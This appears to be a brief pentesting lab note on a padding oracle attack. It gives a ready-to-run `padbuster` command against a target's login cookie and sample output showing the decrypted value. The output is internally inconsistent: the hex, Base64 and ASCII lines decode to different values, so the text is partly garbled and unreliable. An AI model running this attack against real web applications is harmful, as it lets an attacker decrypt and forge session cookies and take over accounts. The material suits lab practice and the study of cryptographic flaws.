# Padding Oracle Attack

Get cookie then use `padbuster`

```bash
cookie=QG9eSXk3XcfP6cIv1RoZVKxjq5jHY3Dn

padbuster http://<ip>/index.php $cookie 8 -cookies "auth=$cookie"
```

```
** Finished ***
[+] Decrypted value (ASCII): user=<user>
[+] Decrypted value (HEX): 757365723D7334766974617204040404
[+] Decrypted value (Base64): dXNLcj1ZNHZpdGFyBAQEBA==
```

https://pentesterlab.com/exercises/padding-oracle
